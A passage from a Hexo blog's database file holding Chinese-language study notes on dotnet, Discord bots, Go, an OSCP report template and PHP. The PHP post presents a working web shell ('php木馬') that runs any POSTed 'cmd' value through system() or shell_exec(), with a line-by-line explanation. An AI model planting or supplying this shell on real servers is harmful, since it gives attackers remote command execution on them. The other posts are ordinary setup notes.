fb9d6a5ec7f5a57bc99a655f","modified":1749033823994},{"_id":"public/2025/05/31/gh基礎/index.html","hash":"135e11cd85d4b69c85e138c0f447b1771a49cad1","modified":1749033823994},{"_id":"public/2025/05/30/YARA規則基礎/index.html","hash":"3551160dc6226aef3e9cc4a632574d9e449358e6","modified":1749033823994},{"_id":"public/2025/05/30/git基礎/index.html","hash":"b798bdba22061282ac2a29d6e9f380d372d23b89","modified":1749033823994},{"_id":"public/2025/05/30/linux基本命令基礎/index.html","hash":"82fba89c070765b419cb0badbb90a533b5b39d2e","modified":1749033823994},{"_id":"public/2025/05/30/C-基礎dotnet/index.html","hash":"8ae3d3749d2260c4803876ebdbd39b92e67ff7f1","modified":1749033823994},{"_id":"public/2025/05/30/hexo基礎/index.html","hash":"f9c34158e8f3a13795534df3a2a6adb01a5122ec","modified":1749033823994},{"_id":"public/2025/05/30/tmux基礎/index.html","hash":"8ccca45389d59758fddc22fed4c6411ccd72d211","modified":1749033823994},{"_id":"public/2025/05/30/grep基礎/index.html","hash":"e03a61bb91944960e5911aacdc7df2b51d2407cc","modified":1749033823994},{"_id":"public/2025/05/30/apk逆向基礎/index.html","hash":"bef9d7085dbf57b697e689bd9297cc2f9c500e2f","modified":1749033823994},{"_id":"public/2025/05/30/chrome console/index.html","hash":"f206c8ff43b02067ae4a6252a1c3f7444840bd29","modified":1749033823994},{"_id":"public/2025/05/30/hash類型/index.html","hash":"46b8096aa5e23a30101a605d208d5d44f28b6e67","modified":1749033823994},{"_id":"public/2025/05/29/還原cryptojs採坑紀錄/index.html","hash":"ceb2a177d428c64be1d720fcc75bb13c5486850d","modified":1749033823994},{"_id":"public/2025/05/27/echo基礎/index.html","hash":"a549f2869d656c4b9c4ecee9d42003ca2d149d74","modified":1749033823994},{"_id":"public/archives/index.html","hash":"32ef6f5080891f3dcc0e6ca8d826e28040e05ac2","modified":1749033823994},{"_id":"public/archives/page/2/index.html","hash":"f0453d2e248b8254ad67e8839c610f8515c5b8ca","modified":1749033823994},{"_id":"public/archives/page/3/index.html","hash":"c1c10d42f6951aa39550cc6010a0681e9b3d4023","modified":1749033823994},{"_id":"public/archives/2025/index.html","hash":"3eea97f43cdb47e4a88716fc245a34ff6694e389","modified":1749033823994},{"_id":"public/archives/2025/page/2/index.html","hash":"fc800b74c36bcfb31c245893791e805c33da893a","modified":1749033823994},{"_id":"public/archives/2025/page/3/index.html","hash":"3e64d773c3fd9ec574f924f8f9e0b001af765d7f","modified":1749033823994},{"_id":"public/archives/2025/05/index.html","hash":"a6252d012e41fe2d5dbfa6765df68f14c4f1742a","modified":1749033823994},{"_id":"public/archives/2025/05/page/2/index.html","hash":"f1b39429c4bd8f0f9a399502c6aa5c6b309802b7","modified":1749033823994},{"_id":"public/archives/2025/06/index.html","hash":"6a54f48c4d9aff762575fe6d9db415144fd9be10","modified":1749033823994},{"_id":"public/archives/2025/06/page/2/index.html","hash":"b8f162e4f475642f933b154e396f958ed3f7112a","modified":1749033823994},{"_id":"public/categories/語言適應/index.html","hash":"412d574b6eaf575e0eb75aac55e3ef8b1fb1c087","modified":1749033823994},{"_id":"public/categories/linux/index.html","hash":"658f772eccc45d00c6c3e8b71671dd09a7278a9b","modified":1749033823994},{"_id":"public/categories/網站部署基礎/index.html","hash":"26c5a5dd851f21675d06522ede0af3c18e221fc0","modified":1749033823994},{"_id":"public/index.html","hash":"09a323dee924ac0417ca4bb934972d0278c8adba","modified":1749033823994},{"_id":"public/page/2/index.html","hash":"afd0dbaa79ddb9efd01474e92001869565f357c2","modified":1749033823994},{"_id":"public/page/3/index.html","hash":"c3b0069dc98c9b8944744e7859d19b833de5c31c","modified":1749033823994},{"_id":"public/images/600211-800w.webp","hash":"f8340a9ec17e218656b2bc30ff88ca46e8b8476e","modified":1749033823994},{"_id":"public/images/600211-600w.webp","hash":"8c40e543beaa335411118f032513df0d59982993","modified":1749033823994},{"_id":"public/images/banner-600w.webp","hash":"21a2f645b88e10b3bcbddc617142820897087b9c","modified":1749033823994},{"_id":"public/images/banner-800w.webp","hash":"b6816d3aff990eb6776c1257ef4489a9a75e9a1d","modified":1749033823994},{"_id":"public/images/algolia_logo.svg","hash":"be6c3b8022eaabf5402737ea6dc334b0478181e4","modified":1749033823994},{"_id":"public/images/favicon.ico","hash":"71abb7df9c06622a19baf55841dc36ac0b965a6f","modified":1749033823994},{"_id":"public/images/reimu.png","hash":"7bbaba99fda7b420759e169d72d226e4c4e9e665","modified":1749033823994},{"_id":"public/images/taichi-fill.png","hash":"1b1411207fc92903e76d414ebe6f4f32267de991","modified":1749033823994},{"_id":"public/images/taichi-fill.svg","hash":"04717067112e30d7cd3a968cdd2e8b3a37bf7298","modified":1749033823994},{"_id":"public/images/taichi.png","hash":"297865b94e16a14c14447f6265d850cdbbb31852","modified":1749033823994},{"_id":"public/images/taichi.svg","hash":"adb1592550ee6e020b6358e688ed56fd19af072f","modified":1749033823994},{"_id":"public/images/cursor/reimu-cursor-default.png","hash":"f2346c0da25f0657641de8d37ad2236fcd73580e","modified":1749033823994},{"_id":"public/images/cursor/reimu-cursor-pointer.png","hash":"e5e8ec35303257face7e9ddca0a17e45a33c19c8","modified":1749033823994},{"_id":"public/images/cursor/reimu-cursor-text.png","hash":"c9fb0e6ed0e35033ea77544ff64531a6e0ac4e03","modified":1749033823994},{"_id":"public/images/banner.webp","hash":"3ce4678c7510496b551672808b95dc21c4709eb7","modified":1749033823994},{"_id":"public/css/fontawesome.css","hash":"e543fcab77e653448d474a11a49e6ee9dbfc16ef","modified":1749033823994},{"_id":"public/css/heat-map.css","hash":"f0b8699c20c9969d06df26d6faba14f8e83e2fbb","modified":1749033823994},{"_id":"public/css/iconfont.css","hash":"73cc1d6886671c23de18448c243bf9cf1f77f3ba","modified":1749033823994},{"_id":"public/css/loader.css","hash":"15b83dc02ae09aebfac432324adaea29d8e28921","modified":1749033823994},{"_id":"public/css/style.css","hash":"609cc55067f851d14cc8f73b4f61b881a31ecfb5","modified":1749033823994},{"_id":"public/js/algolia_search.js","hash":"b01c5d9d443f4a073a24212fcf536fb5ce593c94","modified":1749033823994},{"_id":"public/js/aos.js","hash":"703e8ed1163f299905a81721ebdef0f74ae77353","modified":1749033823994},{"_id":"public/js/generator_search.js","hash":"672bf9f15d0eb32145a8786d4c1b2b4724c162f3","modified":1749033823994},{"_id":"public/js/heat_map.js","hash":"efd23574ad977f2b6ef5c9c0e6595f4d47df0a9d","modified":1749033823994},{"_id":"public/js/insert_highlight.js","hash":"2fcb5828e3d40e3c254081bf0c162a941c851532","modified":1749033823994},{"_id":"public/js/pjax.js","hash":"9eba500d50e8adca7f30908c37f3cca1f199ac8a","modified":1749033823994},{"_id":"public/js/pjax_script.js","hash":"362526fb785844d3f82289d9954bb48c526e7e89","modified":1749033823994},{"_id":"public/js/script.js","hash":"067a123933be9126f42b4e434185aa39eb7e888c","modified":1749033823994},{"_id":"public/js/service_worker.js","hash":"578892dc37035e5d75623061daab284a55d580ce","modified":1749033823994},{"_id":"public/js/sw.js","hash":"72a5e8709e5d1087f74a42eb0287398d3ed7a6a0","modified":1749033823994},{"_id":"public/image/lay.jpg","hash":"3dec015da8b1cd4ed5898b66dd09f278eeb5e457","modified":1749033823994},{"_id":"public/avatar/600211.webp","hash":"9e508bc911c96dc0348055279fab4078f10533f5","modified":1749033823994},{"_id":"public/images/600211.webp","hash":"9e508bc911c96dc0348055279fab4078f10533f5","modified":1749033823994},{"_id":"public/images/600211.png","hash":"b2bcb8b5ee54febb45883d86da054f51b82e8b5a","modified":1749033823994},{"_id":"public/images/banner.png","hash":"74b7747a8e48c2e53f7d2e80059aa40afe29b3a0","modified":1749033823994}],"Category":[{"name":"語言適應","_id":"cmbhtkwa10004zrlr0nn2es9v"},{"name":"linux","_id":"cmbhtkwa7000fzrlr07ybepqy"},{"name":"網站部署基礎","_id":"cmbhtkwab000uzrlrc7q126fb"}],"Data":[],"Page":[{"title":"友情链接","comments":1,"_content":"\n## 本站信息\n\n## 申请方法\n- 添加本站后，在本页留言，格式如下\n\n~~~yml\n```yml\n- name: #您的名字\n  url: #您的网址\n  desc: #简短描述\n  image: #一张图片\n```\n~~~\n\n## 小伙伴们\n{% friendsLink friend/_data.yml %}\n","source":"friend/index.md","raw":"---\ntitle: 友情链接\ncomments: true\n---\n\n## 本站信息\n\n## 申请方法\n- 添加本站后，在本页留言，格式如下\n\n~~~yml\n```yml\n- name: #您的名字\n  url: #您的网址\n  desc: #简短描述\n  image: #一张图片\n```\n~~~\n\n## 小伙伴们\n{% friendsLink friend/_data.yml %}\n","date":"2025-06-03T23:02:23.610Z","updated":"2025-05-30T10:39:40.699Z","path":"friend/index.html","layout":"page","_id":"cmbhtkw9x0000zrlr8rod8646","content":"<h2 id=\"本站信息\"><a href=\"#本站信息\" class=\"headerlink\" title=\"本站信息\"></a>本站信息</h2><h2 id=\"申请方法\"><a href=\"#申请方法\" class=\"headerlink\" title=\"申请方法\"></a>申请方法</h2><ul>\n<li>添加本站后，在本页留言，格式如下</li>\n</ul>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">```yml</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"comment\">#您的名字</span></span><br><span class=\"line\">  <span class=\"attr\">url:</span> <span class=\"comment\">#您的网址</span></span><br><span class=\"line\">  <span class=\"attr\">desc:</span> <span class=\"comment\">#简短描述</span></span><br><span class=\"line\">  <span class=\"attr\">image:</span> <span class=\"comment\">#一张图片</span></span><br><span class=\"line\"><span class=\"string\">```</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"小伙伴们\"><a href=\"#小伙伴们\" class=\"headerlink\" title=\"小伙伴们\"></a>小伙伴们</h2><div class=\"friend-wrap\" data-aos=\"zoom-in\"><div class=\"friend-item-wrap\">\n    <a href=\"https://d-sketon.github.io/\" rel=\"noopener external nofollow noreferrer\" target=\"_blank\"></a>\n    <div class=\"friend-icon-wrap\">\n      <div class=\"friend-icon\">\n          <img data-src=\"https://d-sketon.github.io/avatar/avatar.webp\" data-sizes=\"auto\" alt=\"D-Sketon\" class=\"lazyload\">\n      </div>\n    </div>\n    <div class=\"friend-info-wrap\">\n      <div class=\"friend-name\">\n          D-Sketon \n      </div>\n      <div class=\"friend-desc\">\n        一个车万人\n      </div>\n    </div>\n  </div></div>\n","excerpt":"","more":"<h2 id=\"本站信息\"><a href=\"#本站信息\" class=\"headerlink\" title=\"本站信息\"></a>本站信息</h2><h2 id=\"申请方法\"><a href=\"#申请方法\" class=\"headerlink\" title=\"申请方法\"></a>申请方法</h2><ul>\n<li>添加本站后，在本页留言，格式如下</li>\n</ul>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">```yml</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"comment\">#您的名字</span></span><br><span class=\"line\">  <span class=\"attr\">url:</span> <span class=\"comment\">#您的网址</span></span><br><span class=\"line\">  <span class=\"attr\">desc:</span> <span class=\"comment\">#简短描述</span></span><br><span class=\"line\">  <span class=\"attr\">image:</span> <span class=\"comment\">#一张图片</span></span><br><span class=\"line\"><span class=\"string\">```</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"小伙伴们\"><a href=\"#小伙伴们\" class=\"headerlink\" title=\"小伙伴们\"></a>小伙伴们</h2><div class=\"friend-wrap\" data-aos=\"zoom-in\"><div class=\"friend-item-wrap\">\n    <a href=\"https://d-sketon.github.io/\" rel=\"noopener external nofollow noreferrer\" target=\"_blank\"></a>\n    <div class=\"friend-icon-wrap\">\n      <div class=\"friend-icon\">\n          <img data-src=\"https://d-sketon.github.io/avatar/avatar.webp\" data-sizes=\"auto\" alt=\"D-Sketon\" class=\"lazyload\">\n      </div>\n    </div>\n    <div class=\"friend-info-wrap\">\n      <div class=\"friend-name\">\n          D-Sketon \n      </div>\n      <div class=\"friend-desc\">\n        一个车万人\n      </div>\n    </div>\n  </div></div>\n"},{"title":"关于","date":"2021-09-22T13:01:47.000Z","comments":1,"_content":"## 关于\n","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2021-09-22 21:01:47\ncomments: true\n---\n## 关于\n","updated":"2025-05-30T10:39:40.609Z","path":"about/index.html","layout":"page","_id":"cmbhtkwa00002zrlr5ddla4f9","content":"<h2 id=\"关于\"><a href=\"#关于\" class=\"headerlink\" title=\"关于\"></a>关于</h2>","excerpt":"","more":"<h2 id=\"关于\"><a href=\"#关于\" class=\"headerlink\" title=\"关于\"></a>关于</h2>"}],"Post":[{"title":"C#基礎dotnet","date":"2025-05-30T13:37:38.000Z","_content":"\n\n用 snap 安裝 dotnet-sdk \n經典模式 --classic\n表示這個 snap 需要較多系統權限，允許比較自由的存取系統檔案，類似傳統安裝方式\n\n    sudo snap install dotnet-sdk --classic\n\n建立一個別名 (alias)，讓你用更簡短的指令呼叫 snap 裡的程式。\n使我能輸入dotnet 調用\n\n    sudo snap alias dotnet-sdk.dotnet dotnet\n\n驗證安裝\n\n    dotnet --version\n\n開啟\n\n    dotnet 第二個網站.dll","source":"_posts/C-基礎dotnet.md","raw":"---\ntitle: C#基礎dotnet\ndate: 2025-05-30 21:37:38\ntags:\ncategories:\n  - 語言適應\n---\n\n\n用 snap 安裝 dotnet-sdk \n經典模式 --classic\n表示這個 snap 需要較多系統權限，允許比較自由的存取系統檔案，類似傳統安裝方式\n\n    sudo snap install dotnet-sdk --classic\n\n建立一個別名 (alias)，讓你用更簡短的指令呼叫 snap 裡的程式。\n使我能輸入dotnet 調用\n\n    sudo snap alias dotnet-sdk.dotnet dotnet\n\n驗證安裝\n\n    dotnet --version\n\n開啟\n\n    dotnet 第二個網站.dll","slug":"C-基礎dotnet","published":1,"updated":"2025-06-01T17:19:51.417Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkw9y0001zrlr6kqc9xyd","content":"<p>用 snap 安裝 dotnet-sdk<br>經典模式 –classic<br>表示這個 snap 需要較多系統權限，允許比較自由的存取系統檔案，類似傳統安裝方式</p>\n<pre><code>sudo snap install dotnet-sdk --classic\n</code></pre>\n<p>建立一個別名 (alias)，讓你用更簡短的指令呼叫 snap 裡的程式。<br>使我能輸入dotnet 調用</p>\n<pre><code>sudo snap alias dotnet-sdk.dotnet dotnet\n</code></pre>\n<p>驗證安裝</p>\n<pre><code>dotnet --version\n</code></pre>\n<p>開啟</p>\n<pre><code>dotnet 第二個網站.dll\n</code></pre>\n","excerpt":"","more":"<p>用 snap 安裝 dotnet-sdk<br>經典模式 –classic<br>表示這個 snap 需要較多系統權限，允許比較自由的存取系統檔案，類似傳統安裝方式</p>\n<pre><code>sudo snap install dotnet-sdk --classic\n</code></pre>\n<p>建立一個別名 (alias)，讓你用更簡短的指令呼叫 snap 裡的程式。<br>使我能輸入dotnet 調用</p>\n<pre><code>sudo snap alias dotnet-sdk.dotnet dotnet\n</code></pre>\n<p>驗證安裝</p>\n<pre><code>dotnet --version\n</code></pre>\n<p>開啟</p>\n<pre><code>dotnet 第二個網站.dll\n</code></pre>\n"},{"title":"Discord基礎","date":"2025-06-02T07:02:18.000Z","_content":"\n\n下載\n\n    git clone https://github.com/discord/discord-example-app.git\n\ncd 然後將\n\n./env sample 改成./env\n填好參數\n\n邀請\n\nhttps://discord.com/oauth2/authorize?client_id=1379075368144867338&permissions=2147483648&scope=bot%20applications.commands","source":"_posts/Discord.md","raw":"---\ntitle: Discord基礎\ndate: 2025-06-02 15:02:18\ntags:\n---\n\n\n下載\n\n    git clone https://github.com/discord/discord-example-app.git\n\ncd 然後將\n\n./env sample 改成./env\n填好參數\n\n邀請\n\nhttps://discord.com/oauth2/authorize?client_id=1379075368144867338&permissions=2147483648&scope=bot%20applications.commands","slug":"Discord","published":1,"updated":"2025-06-02T12:48:19.399Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa10003zrlr5spr21s7","content":"<p>下載</p>\n<pre><code>git clone https://github.com/discord/discord-example-app.git\n</code></pre>\n<p>cd 然後將</p>\n<p>.&#x2F;env sample 改成.&#x2F;env<br>填好參數</p>\n<p>邀請</p>\n<p><a href=\"https://discord.com/oauth2/authorize?client_id=1379075368144867338&permissions=2147483648&scope=bot%20applications.commands\">https://discord.com/oauth2/authorize?client_id=1379075368144867338&amp;permissions=2147483648&amp;scope=bot%20applications.commands</a></p>\n","excerpt":"","more":"<p>下載</p>\n<pre><code>git clone https://github.com/discord/discord-example-app.git\n</code></pre>\n<p>cd 然後將</p>\n<p>.&#x2F;env sample 改成.&#x2F;env<br>填好參數</p>\n<p>邀請</p>\n<p><a href=\"https://discord.com/oauth2/authorize?client_id=1379075368144867338&permissions=2147483648&scope=bot%20applications.commands\">https://discord.com/oauth2/authorize?client_id=1379075368144867338&amp;permissions=2147483648&amp;scope=bot%20applications.commands</a></p>\n"},{"title":"GO基礎","date":"2025-06-01T16:54:55.000Z","_content":"\n\n\n到這邊安裝 [官網] (https://go.dev/dl/)\n    \n\n查看版本  \n\n    go version\n\n測試安裝是否成功\n\n    package main\n\n    import \"fmt\"\n\n    func main() {\n        fmt.Println(\"Hello, Go!\")\n    }\n\n\n\n測試\n\n    go run main.go\n\n\n編譯\n    go build main.go\n    ./main.exe","source":"_posts/GO基礎.md","raw":"---\ntitle: GO基礎\ndate: 2025-06-02 00:54:55\ntags:\ncategories:\n  - 語言適應\n---\n\n\n\n到這邊安裝 [官網] (https://go.dev/dl/)\n    \n\n查看版本  \n\n    go version\n\n測試安裝是否成功\n\n    package main\n\n    import \"fmt\"\n\n    func main() {\n        fmt.Println(\"Hello, Go!\")\n    }\n\n\n\n測試\n\n    go run main.go\n\n\n編譯\n    go build main.go\n    ./main.exe","slug":"GO基礎","published":1,"updated":"2025-06-01T17:19:32.321Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa20005zrlra3ymczyv","content":"<p>到這邊安裝 [官網] (<a href=\"https://go.dev/dl/\">https://go.dev/dl/</a>)</p>\n<p>查看版本  </p>\n<pre><code>go version\n</code></pre>\n<p>測試安裝是否成功</p>\n<pre><code>package main\n\nimport &quot;fmt&quot;\n\nfunc main() &#123;\n    fmt.Println(&quot;Hello, Go!&quot;)\n&#125;\n</code></pre>\n<p>測試</p>\n<pre><code>go run main.go\n</code></pre>\n<p>編譯<br>    go build main.go<br>    .&#x2F;main.exe</p>\n","excerpt":"","more":"<p>到這邊安裝 [官網] (<a href=\"https://go.dev/dl/\">https://go.dev/dl/</a>)</p>\n<p>查看版本  </p>\n<pre><code>go version\n</code></pre>\n<p>測試安裝是否成功</p>\n<pre><code>package main\n\nimport &quot;fmt&quot;\n\nfunc main() &#123;\n    fmt.Println(&quot;Hello, Go!&quot;)\n&#125;\n</code></pre>\n<p>測試</p>\n<pre><code>go run main.go\n</code></pre>\n<p>編譯<br>    go build main.go<br>    .&#x2F;main.exe</p>\n"},{"title":"OSCP-Exam-Report","date":"2025-06-02T05:00:14.000Z","_content":"\ninstall\n\n    apt install texlive-latex-recommended texlive-fonts-extra texlive-latex-extra pandoc p7zip-full\n\n\n\nupgrade\n\n    sudo apt update\n    sudo apt install ruby ruby-dev build-essential\n    gem install bundler\n    undle install\n    sudo apt install texlive-full\n\ndownload\n    \n    git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown.git\n\n\n\nexport PDF\n    pandoc src/OSCP-exam-report-template_whoisflynn_v3.2.md \\\n    -o output/OSCP-OS-XXXXX-Exam-Report.pdf \\\n    --from markdown+yaml_metadata_block+raw_html \\\n    --template eisvogel \\\n    --table-of-contents \\\n    --toc-depth 6 \\\n    --number-sections \\\n    --top-level-division=chapter \\\n    --highlight-style breezedark \\\n    --resource-path=.:src\n\n\n","source":"_posts/OSCP-Exam-Report.md","raw":"---\ntitle: OSCP-Exam-Report\ndate: 2025-06-02 13:00:14\ntags:\n---\n\ninstall\n\n    apt install texlive-latex-recommended texlive-fonts-extra texlive-latex-extra pandoc p7zip-full\n\n\n\nupgrade\n\n    sudo apt update\n    sudo apt install ruby ruby-dev build-essential\n    gem install bundler\n    undle install\n    sudo apt install texlive-full\n\ndownload\n    \n    git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown.git\n\n\n\nexport PDF\n    pandoc src/OSCP-exam-report-template_whoisflynn_v3.2.md \\\n    -o output/OSCP-OS-XXXXX-Exam-Report.pdf \\\n    --from markdown+yaml_metadata_block+raw_html \\\n    --template eisvogel \\\n    --table-of-contents \\\n    --toc-depth 6 \\\n    --number-sections \\\n    --top-level-division=chapter \\\n    --highlight-style breezedark \\\n    --resource-path=.:src\n\n\n","slug":"OSCP-Exam-Report","published":1,"updated":"2025-06-02T18:00:23.030Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa30006zrlrcdm0eicy","content":"<p>install</p>\n<pre><code>apt install texlive-latex-recommended texlive-fonts-extra texlive-latex-extra pandoc p7zip-full\n</code></pre>\n<p>upgrade</p>\n<pre><code>sudo apt update\nsudo apt install ruby ruby-dev build-essential\ngem install bundler\nundle install\nsudo apt install texlive-full\n</code></pre>\n<p>download</p>\n<pre><code>git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown.git\n</code></pre>\n<p>export PDF<br>    pandoc src&#x2F;OSCP-exam-report-template_whoisflynn_v3.2.md <br>    -o output&#x2F;OSCP-OS-XXXXX-Exam-Report.pdf <br>    –from markdown+yaml_metadata_block+raw_html <br>    –template eisvogel <br>    –table-of-contents <br>    –toc-depth 6 <br>    –number-sections <br>    –top-level-division&#x3D;chapter <br>    –highlight-style breezedark <br>    –resource-path&#x3D;.:src</p>\n","excerpt":"","more":"<p>install</p>\n<pre><code>apt install texlive-latex-recommended texlive-fonts-extra texlive-latex-extra pandoc p7zip-full\n</code></pre>\n<p>upgrade</p>\n<pre><code>sudo apt update\nsudo apt install ruby ruby-dev build-essential\ngem install bundler\nundle install\nsudo apt install texlive-full\n</code></pre>\n<p>download</p>\n<pre><code>git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown.git\n</code></pre>\n<p>export PDF<br>    pandoc src&#x2F;OSCP-exam-report-template_whoisflynn_v3.2.md <br>    -o output&#x2F;OSCP-OS-XXXXX-Exam-Report.pdf <br>    –from markdown+yaml_metadata_block+raw_html <br>    –template eisvogel <br>    –table-of-contents <br>    –toc-depth 6 <br>    –number-sections <br>    –top-level-division&#x3D;chapter <br>    –highlight-style breezedark <br>    –resource-path&#x3D;.:src</p>\n"},{"title":"PHP基礎","date":"2025-06-02T05:00:14.000Z","_content":"\n\nphp木馬 (windows)\n\n    <?php\n    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n        $cmd = $_POST['cmd'];\n        echo \"<pre>\";\n        system($cmd);\n        echo \"</pre>\";\n    }\n    ?>\n\n    <form method=\"post\">\n        <input type=\"text\" name=\"cmd\" >\n        <button type=\"submit\">執行</button>\n    </form>\n\n\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n    $cmd = $_POST['cmd'];\n    echo \"<pre>\";\n    echo shell_exec($cmd);\n    echo \"</pre>\";\n}\n?>\n<form method=\"post\">\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n    <button type=\"submit\">執行</button>\n</form>\n\n如果是POST 且body有cmd  $cmd=cmd中的值 執行cmd中命令 並透過echo 印出來\n\n    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) \n    $cmd = $_POST['cmd'];\n    echo shell_exec($cmd);\n\n輸出<pre></pre> html標籤保留格式，方便顯示 shell 結果\n\n    echo \"<pre>\";\n    echo \"</pre>\";\n\n\n包裹住的部分是  後端\n\n    <?php?>\n\n包裹住的地方是前端 method=\"post\" 是方法   submit是執行方法\ntext 是我輸入的文字 也就是cmd=text\n\n\n    <form></form>\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n\n","source":"_posts/PHP基礎.md","raw":"---\ntitle: PHP基礎\ndate: 2025-06-02 13:00:14\ntags:\n---\n\n\nphp木馬 (windows)\n\n    <?php\n    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n        $cmd = $_POST['cmd'];\n        echo \"<pre>\";\n        system($cmd);\n        echo \"</pre>\";\n    }\n    ?>\n\n    <form method=\"post\">\n        <input type=\"text\" name=\"cmd\" >\n        <button type=\"submit\">執行</button>\n    </form>\n\n\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n    $cmd = $_POST['cmd'];\n    echo \"<pre>\";\n    echo shell_exec($cmd);\n    echo \"</pre>\";\n}\n?>\n<form method=\"post\">\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n    <button type=\"submit\">執行</button>\n</form>\n\n如果是POST 且body有cmd  $cmd=cmd中的值 執行cmd中命令 並透過echo 印出來\n\n    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) \n    $cmd = $_POST['cmd'];\n    echo shell_exec($cmd);\n\n輸出<pre></pre> html標籤保留格式，方便顯示 shell 結果\n\n    echo \"<pre>\";\n    echo \"</pre>\";\n\n\n包裹住的部分是  後端\n\n    <?php?>\n\n包裹住的地方是前端 method=\"post\" 是方法   submit是執行方法\ntext 是我輸入的文字 也就是cmd=text\n\n\n    <form></form>\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n\n","slug":"PHP基礎","published":1,"updated":"2025-06-02T15:38:57.343Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa40007zrlr3l493z1n","content":"<p>php木馬 (windows)</p>\n<pre><code>&lt;?php\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_POST[&#39;cmd&#39;])) &#123;\n    $cmd = $_POST[&#39;cmd&#39;];\n    echo &quot;&lt;pre&gt;&quot;;\n    system($cmd);\n    echo &quot;&lt;/pre&gt;&quot;;\n&#125;\n?&gt;\n\n&lt;form method=&quot;post&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;cmd&quot; &gt;\n    &lt;button type=&quot;submit&quot;&gt;執行&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n    $cmd = $_POST['cmd'];\n    echo \"<pre>\";\n    echo shell_exec($cmd);\n    echo \"</pre>\";\n}\n?>\n<form method=\"post\">\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n    <button type=\"submit\">執行</button>\n</form>\n\n<p>如果是POST 且body有cmd  $cmd&#x3D;cmd中的值 執行cmd中命令 並透過echo 印出來</p>\n<pre><code>if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_POST[&#39;cmd&#39;])) \n$cmd = $_POST[&#39;cmd&#39;];\necho shell_exec($cmd);\n</code></pre>\n<p>輸出<pre></pre> html標籤保留格式，方便顯示 shell 結果</p>\n<pre><code>echo &quot;&lt;pre&gt;&quot;;\necho &quot;&lt;/pre&gt;&quot;;\n</code></pre>\n<p>包裹住的部分是  後端</p>\n<pre><code>&lt;?php?&gt;\n</code></pre>\n<p>包裹住的地方是前端 method&#x3D;”post” 是方法   submit是執行方法<br>text 是我輸入的文字 也就是cmd&#x3D;text</p>\n<pre><code>&lt;form&gt;&lt;/form&gt;\n&lt;input type=&quot;text&quot; name=&quot;cmd&quot; style=&quot;width:300px;&quot;&gt;\n</code></pre>\n","excerpt":"","more":"<p>php木馬 (windows)</p>\n<pre><code>&lt;?php\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_POST[&#39;cmd&#39;])) &#123;\n    $cmd = $_POST[&#39;cmd&#39;];\n    echo &quot;&lt;pre&gt;&quot;;\n    system($cmd);\n    echo &quot;&lt;/pre&gt;&quot;;\n&#125;\n?&gt;\n\n&lt;form method=&quot;post&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;cmd&quot; &gt;\n    &lt;button type=&quot;submit&quot;&gt;執行&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>\n<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {\n    $cmd = $_POST['cmd'];\n    echo \"<pre>\";\n    echo shell_exec($cmd);\n    echo \"</pre>\";\n}\n?>\n<form method=\"post\">\n    <input type=\"text\" name=\"cmd\" style=\"width:300px;\">\n    <button type=\"submit\">執行</button>\n</form>\n\n<p>如果是POST 且body有cmd  $cmd&#x3D;cmd中的值 執行cmd中命令 並透過echo 印出來</p>\n<pre><code>if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_POST[&#39;cmd&#39;])) \n$cmd = $_POST[&#39;cmd&#39;];\necho shell_exec($cmd);\n</code></pre>\n<p>輸出<pre></pre> html標籤保留格式，方便顯示 shell 結果</p>\n<pre><code>echo &quot;&lt;pre&gt;&quot;;\necho &quot;&lt;/pre&gt;&quot;;\n</code></pre>\n<p>包裹住的部分是  後端</p>\n<pre><code>&lt;?php?&gt;\n</code></pre>\n<p>包裹住的地方是前端 method&#x3D;”post” 是方法   submit是執行方法<br>text 是我輸入的文字 